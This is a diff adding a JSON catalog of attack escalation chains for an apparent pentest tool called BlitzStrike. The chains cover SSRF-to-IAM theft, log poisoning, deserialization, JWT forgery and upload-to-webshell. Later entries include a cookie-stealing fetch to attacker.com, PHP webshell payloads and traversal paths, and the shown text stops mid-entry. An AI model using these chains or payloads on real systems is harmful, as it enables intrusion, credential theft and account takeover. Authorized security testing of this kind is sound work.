@@ -1,0 +1,2759 @@
+{
+  "$schema": "blitzstrike-chains-v1",
+  "version": "1.0.0",
+  "_comment": "Escalation chains. Each chain links a confirmed primitive into a higher-impact outcome. BlitzStrike edge vs other catalogs: every step carries an invariant_check (what MUST hold) and a negative_control (how to refute). Never hardcode in Python \u2014 edit here.",
+  "min_severity": "medium",
+  "chains": [
+    {
+      "id": "ssrf_cloud_metadata",
+      "name": "SSRF to Cloud Metadata Exfiltration",
+      "triggers": [
+        "ssrf",
+        "metadata",
+        "169.254",
+        "webhook",
+        "fetch url",
+        "server-side request"
+      ],
+      "required_findings": [
+        "ssrf_unvalidated_url"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SSRF with a callback to an attacker-controlled server",
+          "tool_hint": "strike_verify",
+          "success_criteria": "DNS/HTTP callback received with target IP",
+          "invariant_check": "URL is fetched server-side without host allowlist",
+          "negative_control": "same URL through a non-vulnerable endpoint produces no callback"
+        },
+        {
+          "order": 2,
+          "action": "Probe cloud metadata endpoint",
+          "tool_hint": "strike_verify",
+          "success_criteria": "200 OK from 169.254.169.254/latest/meta-data/",
+          "invariant_check": "no egress filter on metadata IP",
+          "negative_control": "metadata request from own host returns 403/empty"
+        },
+        {
+          "order": 3,
+          "action": "Exfiltrate IAM credentials",
+          "tool_hint": "strike_verify",
+          "success_criteria": "AccessKeyId + SecretAccessKey extracted",
+          "invariant_check": "IMDSv1 enabled (no token header required)",
+          "negative_control": "request without X-aws-ec2-metadata-token still blocked = IMDSv2"
+        }
+      ],
+      "tools": [
+        "ssrfmap",
+        "gopherus",
+        "curl"
+      ]
+    },
+    {
+      "id": "lfi_log_poison_rce",
+      "name": "LFI via Log Poisoning to RCE",
+      "triggers": [
+        "lfi",
+        "include",
+        "log poison",
+        "path traversal",
+        "file include"
+      ],
+      "required_findings": [
+        "lfi_unvalidated_include"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Inject PHP into web server logs via User-Agent header",
+          "tool_hint": "strike_verify",
+          "success_criteria": "log contains <?php system(...) ?> payload",
+          "invariant_check": "include path can reach /var/log/* without is_file() wrapper-block",
+          "negative_control": "is_file() on a php:// wrapper path returns false"
+        },
+        {
+          "order": 2,
+          "action": "Trigger inclusion of the poisoned log",
+          "tool_hint": "strike_verify",
+          "success_criteria": "command output reflected in response",
+          "invariant_check": "include uses a path attacker controls, not a fixed safe path",
+          "negative_control": "non-poisoned log include returns only plain text (no exec)"
+        }
+      ],
+      "tools": [
+        "ffuf",
+        "curl",
+        "commix"
+      ]
+    },
+    {
+      "id": "upload_polyglot_rce",
+      "name": "Polyglot Upload to RCE (server-config dependent)",
+      "triggers": [
+        "upload",
+        "polyglot",
+        "file upload",
+        "rce",
+        "shell"
+      ],
+      "required_findings": [
+        "upload_weak_validation"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Craft JPEG+PHP polyglot (valid image header + PHP payload)",
+          "tool_hint": "blitz_scan",
+          "success_criteria": "file passes MIME/extension check as image/jpeg",
+          "invariant_check": "upload validation checks extension AND magic bytes but not execution",
+          "negative_control": "pure .php is rejected by the same endpoint"
+        },
+        {
+          "order": 2,
+          "action": "Access uploaded file via web path",
+          "tool_hint": "strike_verify",
+          "success_criteria": "PHP executes (not returned as source)",
+          "invariant_check": "server handler matches .php inside filename (no $ anchor) OR dir has no .htaccess",
+          "negative_control": "default Apache FilesMatch .+\\.ph(ar|p|tml)$ does NOT execute .php.jpg"
+        }
+      ],
+      "tools": [
+        "wpscan",
+        "ffuf",
+        "exiftool"
+      ]
+    },
+    {
+      "id": "appkey_leak_deserialization_rce",
+      "name": "APP_KEY Leak to Deserialization RCE",
+      "triggers": [
+        "app_key",
+        "laravel",
+        "encryption key",
+        "deserialization",
+        "unserialize",
+        "phpggc"
+      ],
+      "required_findings": [
+        "appkey_exposed",
+        "decrypt_endpoint"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Read leaked APP_KEY (no .htaccess, .env exposed, debug error)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "base64:... key retrieved",
+          "invariant_check": "app_key file is served directly (RewriteCond !-f passes existing files)",
+          "negative_control": "file returns 404/403 = protected"
+        },
+        {
+          "order": 2,
+          "action": "Generate PHPGGC gadget (Monolog RCE2/RCE8)",
+          "tool_hint": "blitz_scan",
+          "success_criteria": "gadget.bin generated",
+          "invariant_check": "vendor has Monolog/Symfony gadget class",
+          "negative_control": "unserialize with allowed_classes=['...'] blocks the chain"
+        },
+        {
+          "order": 3,
+          "action": "Encrypt gadget with APP_KEY and POST to decrypt endpoint",
+          "tool_hint": "strike_verify",
+          "success_criteria": "sleep timing / webhook / file write confirms RCE",
+          "invariant_check": "Crypt::decrypt() calls unserialize() on attacker input",
+          "negative_control": "same payload against a non-decrypt route returns error"
+        }
+      ],
+      "tools": [
+        "phpggc",
+        "curl"
+      ]
+    },
+    {
+      "id": "hmac_empty_key_forgery",
+      "name": "Empty HMAC Key Signature Forgery",
+      "triggers": [
+        "hmac",
+        "csrf",
+        "signature",
+        "forge",
+        "hash_hmac",
+        "get_option"
+      ],
+      "required_findings": [
+        "hmac_key_from_get_option"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm HMAC key defaults to empty/false",
+          "tool_hint": "eagle_eye",
+          "success_criteria": "get_option('secret') returns false on fresh install",
+          "invariant_check": "hash_hmac(key) uses get_option() WITHOUT wp_salt() and WITHOUT empty() guard",
+          "negative_control": "hash_hmac with wp_salt() key cannot be forged without wp-config"
+        },
+        {
+          "order": 2,
+          "action": "Forge token with empty key and submit",
+          "tool_hint": "strike_verify",
+          "success_criteria": "signature accepted, action executed",
+          "invariant_check": "token verified with hash_equals against forgeable value",
+          "negative_control": "empty() guard present = token rejected"
+        }
+      ],
+      "tools": [
+        "wpscan",
+        "curl"
+      ]
+    },
+    {
+      "id": "nonce_harvest_auth_bypass",
+      "name": "Nonce Harvest to Broken Authorization",
+      "triggers": [
+        "nonce",
+        "ajax",
+        "nopriv",
+        "auth bypass",
+        "current_user_can"
+      ],
+      "required_findings": [
+        "nonce_only_no_capability"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Scrape nonce from frontend HTML/JS (user ID 0 nonce is global)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "nonce extracted from page source",
+          "invariant_check": "nonce is CSRF protection, NOT authorization",
+          "negative_control": "current_user_can() gate present blocks the action regardless of nonce"
+        },
+        {
+          "order": 2,
+          "action": "Replay privileged AJAX action with harvested nonce",
+          "tool_hint": "strike_verify",
+          "success_criteria": "state-changing action executes unauth",
+          "invariant_check": "handler checks nonce only, no capability check",
+          "negative_control": "same action with bad nonce fails = nonce is a real gate"
+        }
+      ],
+      "tools": [
+        "wpscan",
+        "arjun",
+        "curl"
+      ]
+    },
+    {
+      "id": "intval_form_id_bypass",
+      "name": "intval() Truthy-Check Bypass",
+      "triggers": [
+        "intval",
+        "form_id",
+        "truthy",
+        "id validation",
+        "bypass"
+      ],
+      "required_findings": [
+        "weak_id_check"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Test negative/large form IDs against intval() != 0 gate",
+          "tool_hint": "strike_verify",
+          "success_criteria": "form_id=-1 passes the check",
+          "invariant_check": "if (!$id) die() rejects only ZERO; any non-zero int is truthy",
+          "negative_control": "a real lookup (field-by-meta-name) returns false and rejects"
+        },
+        {
+          "order": 2,
+          "action": "Exploit the bypassed handler (upload/submit)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "handler proceeds without a real form existing",
+          "invariant_check": "no form-existence check downstream",
+          "negative_control": "wp_insert_post form + custom-table row both required elsewhere"
+        }
+      ],
+      "tools": [
+        "wpscan",
+        "curl"
+      ]
+    },
+    {
+      "id": "extract_variable_injection_lfi",
+      "name": "extract() Variable Injection to LFI/RCE",
+      "triggers": [
+        "extract",
+        "variable injection",
+        "lfi",
+        "include",
+        "template"
+      ],
+      "required_findings": [
+        "extract_without_exstr_skip"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find extract($array) without EXTR_SKIP where keys reach include/require",
+          "tool_hint": "eagle_grep",
+          "success_criteria": "extract() site where a key collides with a sink variable",
+          "invariant_check": "extract() without EXTR_SKIP lets array keys overwrite locals",
+          "negative_control": "EXTR_SKIP present = overwrite blocked"
+        },
+        {
+          "order": 2,
+          "action": "POST colliding key to control the included path",
+          "tool_hint": "strike_verify",
+          "success_criteria": "arbitrary file included",
+          "invariant_check": "included variable is attacker-reachable from $_POST/$_REQUEST",
+          "negative_control": "unset() strips dangerous key at entry = safe"
+        }
+      ],
+      "tools": [
+        "ffuf",
+        "arjun"
+      ]
+    },
+    {
+      "id": "php_type_juggling_auth_bypass",
+      "name": "PHP Type Juggling Auth Bypass",
+      "triggers": [
+        "type juggling",
+        "loose comparison",
+        "strcmp",
+        "in_array",
+        "==",
+        "auth"
+      ],
+      "required_findings": [
+        "loose_comparison_auth"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify loose == / in_array without strict / strcmp==0 in auth path",
+          "tool_hint": "eagle_grep",
+          "success_criteria": "comparison on attacker-controlled value",
+          "invariant_check": "PHP '0e...' == '0e...', 'admin'==0, NULL==0, in_array(0,[...])=true",
+          "negative_control": "=== or hash_equals() or in_array(...,true) = safe"
+        },
+        {
+          "order": 2,
+          "action": "Craft payload that satisfies the loose check",
+          "tool_hint": "strike_verify",
+          "success_criteria": "auth bypassed (e.g. 0 matches admin role string)",
+          "invariant_check": "comparison not gated by a prior capability check",
+          "negative_control": "capability check before comparison blocks it"
+        }
+      ],
+      "tools": [
+        "curl",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "split_controller_upload_bypass",
+      "name": "Split-Controller Upload Bypass",
+      "triggers": [
+        "split controller",
+        "checkupload",
+        "task upload",
+        "joomla",
+        "write task"
+      ],
+      "required_findings": [
+        "split_check_write_task"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify check task vs write task in same controller",
+          "tool_hint": "blitz_scan",
+          "success_criteria": "check task guarded, write task unguarded",
+          "invariant_check": "write task callable directly without passing check task",
+          "negative_control": "JSession::checkToken() present in write task = blocked"
+        },
+        {
+          "order": 2,
+          "action": "POST directly to write task with shell file",
+          "tool_hint": "strike_verify",
+          "success_criteria": "file written to web-accessible dir, PHP executes",
+          "invariant_check": "no $user->authorise() and no JFile extension check in write task",
+          "negative_control": "write task re-validates extension = safe"
+        }
+      ],
+      "tools": [
+        "joomscan",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "race_condition_double_spend",
+      "name": "Race Condition Double-Spend / Double-Use",
+      "triggers": [
+        "race condition",
+        "toctou",
+        "double spend",
+        "concurrent",
+        "nonce reuse"
+      ],
+      "required_findings": [
+        "check_then_act_window"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify check-then-act without atomic reservation",
+          "tool_hint": "eagle_eye",
+          "success_criteria": "existence check and use not atomic",
+          "invariant_check": "check and act happen in a window another process can enter",
+          "negative_control": "fopen('x') / atomic CAS / DB unique constraint blocks"
+        },
+        {
+          "order": 2,
+          "action": "Fire 2+ concurrent requests to win the race",
+          "tool_hint": "strike_verify",
+          "success_criteria": "duplicate execution / double claim observed",
+          "invariant_check": "no serialization of read-modify-write",
+          "negative_control": "single-threaded replay does not duplicate"
+        }
+      ],
+      "tools": [
+        "ffuf",
+        "curl"
+      ]
+    },
+    {
+      "id": "idor_object_reference",
+      "name": "IDOR to Mass Data Access",
+      "triggers": [
+        "idor",
+        "object reference",
+        "sequential id",
+        "enumeration",
+        "bfla"
+      ],
+      "required_findings": [
+        "missing_object_authorization"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Enumerate sequential IDs on a data endpoint",
+          "tool_hint": "strike_verify",
+          "success_criteria": "other user's resource returned with modified ID",
+          "invariant_check": "no ownership check on object reference",
+          "negative_control": "access to own ID works but other ID returns 403"
+        },
+        {
+          "order": 2,
+          "action": "Extract PII / sensitive data across all IDs",
+          "tool_hint": "strike_verify",
+          "success_criteria": "bulk data harvested",
+          "invariant_check": "no rate limit / scope check",
+          "negative_control": "object ownership middleware present"
+        }
+      ],
+      "tools": [
+        "arjun",
+        "ffuf",
+        "katana"
+      ]
+    },
+    {
+      "id": "ssti_template_injection_rce",
+      "name": "SSTI to RCE",
+      "triggers": [
+        "ssti",
+        "template",
+        "jinja",
+        "twig",
+        "{{",
+        "server-side template"
+      ],
+      "required_findings": [
+        "unsafe_template_render"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Reflect {{7*7}} / ${7*7} in a template parameter",
+          "tool_hint": "strike_verify",
+          "success_criteria": "49 reflected (expression evaluated)",
+          "invariant_check": "user input reaches template engine without auto-escape",
+          "negative_control": "literal {{7*7}} returned = not evaluated"
+        },
+        {
+          "order": 2,
+          "action": "Escalate to code execution (os.system / eval via template)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "command output returned",
+          "invariant_check": "engine exposes os/exec primitives and sandbox absent",
+          "negative_control": "sandboxed engine returns error on os access"
+        }
+      ],
+      "tools": [
+        "sstimap",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "sql_injection_to_rce",
+      "name": "SQL Injection to RCE (via write/read primitives)",
+      "triggers": [
+        "sql injection",
+        "sqli",
+        "union select",
+        "into outfile",
+        "load_file"
+      ],
+      "required_findings": [
+        "sql_injection"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SQLi with UNION SELECT / boolean / time-based",
+          "tool_hint": "strike_verify",
+          "success_criteria": "query result / timing difference observed",
+          "invariant_check": "input reaches raw query without prepared statement",
+          "negative_control": "prepared statement returns no injection difference"
+        },
+        {
+          "order": 2,
+          "action": "Escalate via FILE privilege (INTO OUTFILE to webroot / LOAD_FILE)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "shell written or config read",
+          "invariant_check": "DB user has FILE privilege + webroot writable",
+          "negative_control": "secure_file_priv restricts writes"
+        }
+      ],
+      "tools": [
+        "sqlmap",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "path_traversal_file_write",
+      "name": "Path Traversal to Arbitrary File Write",
+      "triggers": [
+        "path traversal",
+        "../",
+        "file write",
+        "zip slip",
+        "download"
+      ],
+      "required_findings": [
+        "unsanitized_path"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Traverse ../ out of intended dir in a write/download param",
+          "tool_hint": "strike_verify",
+          "success_criteria": "file written outside intended dir",
+          "invariant_check": "path used without realpath containment / basename strip",
+          "negative_control": "basename() / realpath containment blocks ../"
+        },
+        {
+          "order": 2,
+          "action": "Write to a runtime-loadable location (cron, authorized_keys, webroot)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "persistence or code execution achieved",
+          "invariant_check": "written file loaded by runtime (CF-003)",
+          "negative_control": "file written but never included = not RCE"
+        }
+      ],
+      "tools": [
+        "ffuf",
+        "curl"
+      ]
+    },
+    {
+      "id": "jwt_alg_confusion_forgery",
+      "name": "JWT Algorithm Confusion Forgery",
+      "triggers": [
+        "jwt",
+        "algorithm confusion",
+        "none algorithm",
+        "token forgery",
+        "rs256 hs256"
+      ],
+      "required_findings": [
+        "jwt_alg_not_pinned"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Test alg=none / RS256\u2192HS256 confusion",
+          "tool_hint": "strike_verify",
+          "success_criteria": "forged token accepted",
+          "invariant_check": "server does not pin algorithm / reuses public key as HMAC secret",
+          "negative_control": "alg pinned + separate secret = rejected"
+        },
+        {
+          "order": 2,
+          "action": "Forge admin claims and replay",
+          "tool_hint": "strike_verify",
+          "success_criteria": "privilege escalation via forged JWT",
+          "invariant_check": "claims trusted without signature-appropriate verification",
+          "negative_control": "signature verified against correct key = forgery fails"
+        }
+      ],
+      "tools": [
+        "jwt_tool",
+        "curl"
+      ]
+    },
+    {
+      "id": "cache_poisoning_xss",
+      "name": "Web Cache Poisoning to Stored XSS",
+      "triggers": [
+        "cache poisoning",
+        "x-forwarded",
+        "host header",
+        "unkeyed",
+        "xss"
+      ],
+      "required_findings": [
+        "unkeyed_header_reflection"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find reflected unkeyed header (X-Forwarded-Host, X-Forwarded-Scheme)",
+          "tool_hint": "strike_verify",
+          "success_criteria": "header value reflected in cached response",
+          "invariant_check": "header not part of cache key but reflected in body",
+          "negative_control": "reflection not cached (no X-Cache: hit) = not persistent"
+        },
+        {
+          "order": 2,
+          "action": "Inject script/redirect into cached response for victim",
+          "tool_hint": "strike_verify",
+          "success_criteria": "poisoned cache served to other users",
+          "invariant_check": "CDN caches the poisoned variant",
+          "negative_control": "Vary header / keying prevents cross-user poisoning"
+        }
+      ],
+      "tools": [
+        "dalfox",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "subdomain_takeover",
+      "name": "Dangling DNS to Subdomain Takeover",
+      "triggers": [
+        "subdomain takeover",
+        "cname",
+        "dangling",
+        "takeover",
+        "nslookup"
+      ],
+      "required_findings": [
+        "dangling_cname"
+      ],
+      "severity": "high",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Find CNAME pointing to unclaimed cloud service",
+          "tool_hint": "strike_verify",
+          "success_criteria": "CNAME resolves to unclaimed/404 cloud endpoint",
+          "invariant_check": "service allows claiming the dangling resource",
+          "negative_control": "CNAME resolves to active claimed resource = not vulnerable"
+        },
+        {
+          "order": 2,
+          "action": "Claim the resource and serve content on the victim subdomain",
+          "tool_hint": "strike_verify",
+          "success_criteria": "control over subdomain content (phishing/stored XSS)",
+          "invariant_check": "no ownership verification on claim",
+          "negative_control": "claim rejected (already owned)"
+        }
+      ],
+      "tools": [
+        "subjack",
+        "subfinder",
+        "nuclei"
+      ]
+    },
+    {
+      "id": "cors_misconfig_data_theft",
+      "name": "CORS Misconfiguration to Data Theft",
+      "triggers": [
+        "cors",
+        "origin reflection",
+        "acaO",
+        "access-control",
+        "cross origin"
+      ],
+      "required_findings": [
+        "cors_origin_reflection"
+      ],
+      "severity": "medium",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Reflect arbitrary Origin with Access-Control-Allow-Credentials: true",
+          "tool_hint": "strike_verify",
+          "success_criteria": "ACAO echoes Origin + ACAC true",
+          "invariant_check": "sensitive endpoint reflects origin with credentials",
+          "negative_control": "public/search endpoint without credentials = low impact"
+        },
+        {
+          "order": 2,
+          "action": "Steal authenticated data via cross-origin fetch",
+          "tool_hint": "strike_verify",
+          "success_criteria": "victim data read cross-origin",
+          "invariant_check": "endpoint returns user-specific data (not public)",
+          "negative_control": "SOP blocks because ACAO is fixed, not reflected"
+        }
+      ],
+      "tools": [
+        "curl",
+        "nikto"
+      ]
+    },
+    {
+      "id": "deserialization_pop_chain",
+      "name": "PHP Object Injection POP Chain to RCE",
+      "triggers": [
+        "deserialization",
+        "unserialize",
+        "pop chain",
+        "gadget",
+        "phar"
+      ],
+      "required_findings": [
+        "unserialize_user_input"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm unserialize() on attacker-controlled data",
+          "tool_hint": "eagle_grep",
+          "success_criteria": "unserialize sink reachable from user input",
+          "invariant_check": "unserialize WITHOUT allowed_classes restriction",
+          "negative_control": "maybe_unserialize on DB-trusted data = not user-controlled"
+        },
+        {
+          "order": 2,
+          "action": "Build POP chain from available gadgets (vendor autoload)",
+          "tool_hint": "eagle_eye",
+          "success_criteria": "__destruct/__wakeup chain reaches exec/write",
+          "invariant_check": "gadget classes present in vendor and autoloaded",
+          "negative_control": "allowed_classes=['Safe'] blocks gadget instantiation"
+        }
+      ],
+      "tools": [
+        "phpggc",
+        "ysoserial"
+      ]
+    },
+    {
+      "id": "open_redirect_token_theft",
+      "name": "Open Redirect to OAuth Token Theft",
+      "triggers": [
+        "open redirect",
+        "redirect",
+        "return url",
+        "oauth",
+        "token"
+      ],
+      "required_findings": [
+        "open_redirect"
+      ],
+      "severity": "medium",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm unvalidated redirect param",
+          "tool_hint": "strike_verify",
+          "success_criteria": "302 to attacker-controlled URL",
+          "invariant_check": "redirect target from user input without allowlist",
+          "negative_control": "redirect fixed to allowlisted domain"
+        },
+        {
+          "order": 2,
+          "action": "Chain redirect into OAuth flow to steal code/token",
+          "tool_hint": "strike_verify",
+          "success_criteria": "authorization code/token leaked to attacker",
+          "invariant_check": "OAuth redirect_uri validation weak (subdomain/prefix match)",
+          "negative_control": "exact redirect_uri match enforced"
+        }
+      ],
+      "tools": [
+        "katana",
+        "dalfox"
+      ]
+    },
+    {
+      "id": "command_injection_os_cmd",
+      "name": "Command Injection to OS Command Execution",
+      "triggers": [
+        "command injection",
+        "os command",
+        "shell",
+        ";id",
+        "$(id)",
+        "backtick"
+      ],
+      "required_findings": [
+        "command_injection"
+      ],
+      "severity": "critical",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Inject metacharacters into a command-adjacent parameter",
+          "tool_hint": "strike_verify",
+          "success_criteria": "injected command output returned",
+          "invariant_check": "user input concatenated into shell/exec without array-form or escaping",
+          "negative_control": "subprocess with args list (no shell) = not injectable"
+        },
+        {
+          "order": 2,
+          "action": "Establish persistence / exfiltration via command",
+          "tool_hint": "strike_verify",
+          "success_criteria": "reverse shell or file write achieved",
+          "invariant_check": "no disable_functions blocking exec/system",
+          "negative_control": "disabled functions prevent execution"
+        }
+      ],
+      "tools": [
+        "commix",
+        "curl"
+      ]
+    },
+    {
+      "id": "sqli_to_rce",
+      "name": "SQL Injection to OS Command Execution",
+      "triggers": [
+        "sql injection",
+        "sqli",
+        "union select",
+        "mysql",
+        "mssql"
+      ],
+      "required_findings": [
+        "sql injection",
+        "mysql"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm SQL injection with UNION-based or error-based technique",
+          "tool_hint": "sqlmap",
+          "success_criteria": "Database banner extracted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Enumerate database schema: tables, columns, users",
+          "tool_hint": "sqlmap",
+          "success_criteria": "Schema map obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Check write access: SELECT @@secure_file_priv",
+          "tool_hint": "manual",
+          "success_criteria": "Empty or writable path returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Write PHP webshell via INTO OUTFILE",
+          "tool_hint": "manual",
+          "success_criteria": "Webshell accessible via HTTP",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Execute OS commands via webshell",
+          "tool_hint": "manual",
+          "success_criteria": "id/whoami output returned",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "xss_to_account_takeover",
+      "name": "XSS to Session Hijacking and Account Takeover",
+      "triggers": [
+        "xss",
+        "cross-site scripting",
+        "script reflected",
+        "dom xss",
+        "script injection",
+        "alert(",
+        "cookie steal",
+        "session hijack"
+      ],
+      "required_findings": [
+        "xss",
+        "cookie"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm XSS with basic alert(1) payload",
+          "tool_hint": "manual",
+          "success_criteria": "Alert dialog appears",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Check for HttpOnly flag on session cookies",
+          "tool_hint": "browser_devtools",
+          "success_criteria": "HttpOnly NOT set",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Craft cookie stealer: fetch('https://attacker.com/?c='+document.cookie)",
+          "tool_hint": "manual",
+          "success_criteria": "Cookie received at attacker server",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Inject stored XSS in high-traffic page (profile, comment, dashboard)",
+          "tool_hint": "manual",
+          "success_criteria": "XSS triggers on page load for other users",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Hijack victim session by injecting stolen cookie",
+          "tool_hint": "browser",
+          "success_criteria": "Logged in as victim",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "idor_to_admin_takeover",
+      "name": "IDOR to Admin Account Takeover",
+      "triggers": [
+        "idor",
+        "insecure direct object",
+        "user_id",
+        "account_id",
+        "unauthorized access"
+      ],
+      "required_findings": [
+        "idor",
+        "user"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm horizontal IDOR: change your user_id to adjacent ID",
+          "tool_hint": "manual",
+          "success_criteria": "Other user data returned",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Enumerate user IDs sequentially (1, 2, 3... 1000)",
+          "tool_hint": "turbo_intruder",
+          "success_criteria": "Admin user identified (role=admin)",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Access admin profile via IDOR: /api/user/{admin_id}",
+          "tool_hint": "manual",
+          "success_criteria": "Admin email, name, settings obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Trigger password reset for admin account",
+          "tool_hint": "manual",
+          "success_criteria": "Reset token sent",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Intercept reset email via stored XSS or email injection",
+          "tool_hint": "manual",
+          "success_criteria": "Reset token captured",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 6,
+          "action": "Reset admin password and login",
+          "tool_hint": "manual",
+          "success_criteria": "Admin access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "file_upload_to_rce",
+      "name": "Unrestricted File Upload to RCE",
+      "triggers": [
+        "upload",
+        "file upload",
+        "avatar",
+        "attachment",
+        "import file"
+      ],
+      "required_findings": [
+        "upload",
+        "webshell"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Test extension filter: upload shell.php, shell.php5, shell.phtml",
+          "tool_hint": "manual",
+          "success_criteria": "File uploaded and accessible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Bypass MIME check: send PHP content with Content-Type: image/jpeg",
+          "tool_hint": "burp",
+          "success_criteria": "Upload accepted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Bypass magic byte: GIF89a; <?php system($_GET['c']); ?>",
+          "tool_hint": "manual",
+          "success_criteria": "File passes signature check",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Double extension bypass: shell.php.jpg, shell.png.php",
+          "tool_hint": "manual",
+          "success_criteria": "Apache executes as PHP",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 5,
+          "action": "Access webshell: /uploads/shell.php?c=id",
+          "tool_hint": "browser",
+          "success_criteria": "Command output returned",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "wpscan",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "lfi_to_rce_via_log_poisoning",
+      "name": "LFI to RCE via Log Poisoning",
+      "triggers": [
+        "lfi",
+        "path traversal",
+        "include",
+        "file inclusion",
+        "../"
+      ],
+      "required_findings": [
+        "lfi",
+        "log"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm LFI: ../../../../etc/passwd returns root:x:0:0",
+          "tool_hint": "manual",
+          "success_criteria": "/etc/passwd content visible",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Poison Apache access.log: User-Agent: <?php system($_GET['c']); ?>",
+          "tool_hint": "curl",
+          "success_criteria": "Payload logged in /var/log/apache/access.log",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Include poisoned log via LFI: ../../var/log/apache/access.log",
+          "tool_hint": "manual",
+          "success_criteria": "PHP payload executed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Execute commands: ?c=id",
+          "tool_hint": "browser",
+          "success_criteria": "Command output returned",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "jwt_algorithm_confusion",
+      "name": "JWT Algorithm Confusion Attack",
+      "triggers": [
+        "jwt",
+        "bearer token",
+        "json web token",
+        "eyj",
+        "token"
+      ],
+      "required_findings": [
+        "jwt",
+        "token"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Capture JWT from Authorization: Bearer header",
+          "tool_hint": "browser_devtools",
+          "success_criteria": "JWT token obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Decode JWT and inspect header: check alg (RS256/HS256)",
+          "tool_hint": "jwt.io",
+          "success_criteria": "Algorithm identified",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Test alg:none: change header to {\"alg\":\"none\"}, remove signature",
+          "tool_hint": "jwt_tool",
+          "success_criteria": "Server accepts unsigned token",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
